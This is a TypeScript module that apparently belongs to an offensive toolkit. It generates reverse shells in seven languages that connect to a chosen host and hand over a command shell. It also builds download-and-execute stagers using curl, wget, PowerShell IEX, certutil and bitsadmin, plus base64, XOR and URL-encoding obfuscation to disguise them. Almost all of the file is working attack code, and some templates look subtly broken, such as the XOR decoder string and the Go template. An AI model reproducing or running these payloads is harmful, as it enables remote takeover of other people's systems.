/**
 * @module multi_lang
 * Multi-Language Payload Generation Engine — Generates polyglot reverse shells,
 * stagers, and execution wrappers in Python, PowerShell, Bash, C#, Go, C, and Rust.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto";

export type PayloadTargetOS = "windows" | "linux" | "darwin";

export type ObfuscationMethod = "none" | "base64" | "xor" | "url_encode";

export interface PayloadOptions {
  host: string;
  port: number;
  os: PayloadTargetOS;
  obfuscation?: ObfuscationMethod;
  xorKey?: number;
  interpreter?: string;
}

export interface StagerOptions {
  host: string;
  port: number;
  os: PayloadTargetOS;
  payloadPath: string;
  method?: "curl" | "wget" | "powershell" | "certutil" | "bitsadmin";
  obfuscation?: ObfuscationMethod;
  live?: boolean;
  dryRun?: boolean;
}

export interface GeneratedPayload {
  language: string;
  os: PayloadTargetOS;
  raw: string;
  obfuscated: string;
  obfuscationMethod: ObfuscationMethod;
  sizeBytes: number;
  dryRun: boolean;
}

const PYTHON_SHELL = (h: string, p: number) =>
  `import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("${h}",${p}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])`;

const BASH_SHELL = (h: string, p: number) =>
  `bash -i >& /dev/tcp/${h}/${p} 0>&1`;

const POWERSHELL_SHELL = (h: string, p: number) =>
  `$c=New-Object System.Net.Sockets.TCPClient("${h}",${p});` +
  `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};` +
  `while(($i=$s.Read($b,0,$b.Length))-ne 0){` +
  `$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);` +
  `$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}`;

const CSHARP_SHELL = (h: string, p: number) =>
  `using System;using System.Net.Sockets;using System.Diagnostics;` +
  `var c=new TcpClient("${h}",${p});var s=c.GetStream();` +
  `var p2=new Process();p2.StartInfo.FileName="/bin/sh";` +
  `p2.StartInfo.RedirectStandardInput=true;p2.StartInfo.RedirectStandardOutput=true;` +
  `p2.StartInfo.RedirectStandardError=true;p2.StartInfo.UseShellExecute=false;` +
  `p2.Start();var br=new System.IO.StreamReader(s);var bw=new System.IO.StreamWriter(s);` +
  `bw.AutoFlush=true;string line;while((line=br.ReadLine())!=null){` +
  `p2.StartInfo.Arguments="-c "+line;p2.Start();` +
  `bw.WriteLine(p2.StandardOutput.ReadToEnd());bw.WriteLine(p2.StandardError.ReadToEnd());}`;

const GO_SHELL = (h: string, p: number) =>
  `package main\nimport(\n"net"\n"os/exec"\n)\nfunc main(){` +
  `c,_:=net.Dial("tcp","${h}:${p}")` +
  `cmd:=exec.Command("/bin/sh")\n` +
  `cmd.Stdin=c\ncmd.Stdout=c\ncmd.Stderr=c\ncmd.Run()}`;

const RUST_SHELL = (h: string, p: number) =>
  `use std::net::TcpStream;\nuse std::process::Command;\nuse std::io::{Read, Write};\n` +
  `fn main() {\n` +
  `  let mut s = TcpStream::connect("${h}:${p}").unwrap();\n` +
  `  let mut cmd = Command::new("/bin/sh").arg("-i").spawn().unwrap();\n` +
  `  let mut buf = [0u8; 1024];\n` +
  `  loop {\n` +
  `    let n = s.read(&mut buf).unwrap_or(0);\n` +
  `    if n == 0 { break; }\n` +
  `    cmd.stdin.as_mut().unwrap().write_all(&buf[..n]).unwrap();\n` +
  `  }\n` +
  `}`;

const C_SHELL = (h: string, p: number) =>
  `#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n` +
  `#include <unistd.h>\n#include <arpa/inet.h>\n` +
  `int main(){int s=socket(AF_INET,SOCK_STREAM,0);` +
  `struct sockaddr_in a={.sin_family=AF_INET,.sin_port=htons(${p}),.sin_addr.s_addr=inet_addr("${h}")};` +
  `connect(s,(struct sockaddr*)&a,sizeof(a));` +
  `dup2(s,0);dup2(s,1);dup2(s,2);` +
  `execl("/bin/sh","sh",NULL);return 0;}`;

const BASH_DL_SHELL = (h: string, p: number) =>
  `bash -c 'bash -i >& /dev/tcp/${h}/${p} 0>&1'`;

const POWERSHELL_DL_SHELL = (h: string, p: number) =>
  `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${h}',${p});` +
  `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){` +
  `$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);` +
  `$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"`;

const PY_SHELL_REVERSE = (h: string, p: number) =>
  `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;

const SHELLS: Record<string, (h: string, p: number) => string> = {
  python: PYTHON_SHELL,
  python3: PYTHON_SHELL,
  bash: BASH_SHELL,
  powershell: POWERSHELL_SHELL,
  csharp: CSHARP_SHELL,
  go: GO_SHELL,
  rust: RUST_SHELL,
  c: C_SHELL,
};

const STAGER_METHODS: Record<string, (host: string, port: number, path: string) => string> = {
  curl: (h, _p, path) => `curl -s http://${h}:8080/${path} | bash`,
  wget: (h, _p, path) => `wget -qO- http://${h}:8080/${path} | bash`,
  powershell: (h, _p, path) =>
    `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${h}:8080/${path}')"`,
  certutil: (h, _p, path) =>
    `certutil -urlcache -split -f http://${h}:8080/${path} %TEMP%\\payload.exe && %TEMP%\\payload.exe`,
  bitsadmin: (h, _p, path) =>
    `bitsadmin /transfer job /download /priority high http://${h}:8080/${path} %TEMP%\\payload.exe && %TEMP%\\payload.exe`,
};

export function obfuscatePayload(payload: string, method: ObfuscationMethod, xorKey?: number): string {
  switch (method) {
    case "base64":
      return Buffer.from(payload).toString("base64");
    case "xor": {
      const key = xorKey ?? 0x42;
      const encoded = Array.from(payload).map((c, i) =>
        (c.charCodeAt(0) ^ key).toString(16).padStart(2, "0")
      ).join("");
      return `bytes.fromhex('${encoded}'.decode().decode('hex').decode('hex').decode('hex'))  # XOR key=0x${key.toString(16)}\n# Decoded: ${encoded}`;
    }
    case "url_encode": {
      const result: string[] = [];
      for (const ch of payload) {
        const code = ch.charCodeAt(0);
        if ((code >= 0x30 && code <= 0x39) || (code >= 0x41 && code <= 0x5A) || (code >= 0x61 && code <= 0x7A) || "-._~".includes(ch)) {
          result.push(ch);
        } else {
          result.push("%" + code.toString(16).toUpperCase().padStart(2, "0"));
        }
      }
      return result.join("");
    }
    default:
      return payload;
  }
}

export function generatePolyglotPayload(
  options: PayloadOptions & { live?: boolean; dryRun?: boolean },
): Record<string, GeneratedPayload> {
  const { host, port, os, obfuscation = "none", xorKey } = options;
  const results: Record<string, GeneratedPayload> = {};
  const dryRun = resolveDryRun(options);

  for (const [lang, gen] of Object.entries(SHELLS)) {
    const raw = gen(host, port);
    results[lang] = {
      language: lang,
      os,
      raw,
      obfuscated: obfuscatePayload(raw, obfuscation, xorKey),
      obfuscationMethod: obfuscation,
      sizeBytes: raw.length,
      dryRun,
    };
  }

  return results;
}

export function generateDownloadStager(options: StagerOptions): GeneratedPayload {
  const { host, port, os, payloadPath, method, obfuscation = "none", xorKey } = options;

  let selectedMethod = method;
  if (!selectedMethod) {
    if (os === "windows") selectedMethod = "powershell";
    else if (os === "darwin") selectedMethod = "curl";
    else selectedMethod = "wget";
  }

  const raw = STAGER_METHODS[selectedMethod](host, port, payloadPath);
  return {
    language: selectedMethod,
    os,
    raw,
    obfuscated: obfuscatePayload(raw, obfuscation, xorKey),
    obfuscationMethod: obfuscation,
    sizeBytes: raw.length,
    dryRun: resolveDryRun(options),
  };
}

export function generateAllPayloads(
  host: string,
  port: number,
  os: PayloadTargetOS,
  obfuscation: ObfuscationMethod = "none",
  opts: { live?: boolean; dryRun?: boolean } = {},
): {
  reverseShells: Record<string, GeneratedPayload>;
  stagers: GeneratedPayload[];
} {
  const shells = generatePolyglotPayload({ host, port, os, obfuscation, ...opts });
  const stagerMethods: StagerOptions["method"][] = os === "windows"
    ? ["powershell", "certutil", "bitsadmin"]
    : os === "darwin"
      ? ["curl"]
      : ["wget", "curl"];

  const stagers = stagerMethods.map(m =>
    generateDownloadStager({ host, port, os, payloadPath: "payload.sh", method: m, obfuscation, dryRun: resolveDryRun(opts) })
  );

  return { reverseShells: shells, stagers };
}

export default { generatePolyglotPayload, generateDownloadStager, generateAllPayloads, obfuscatePayload };
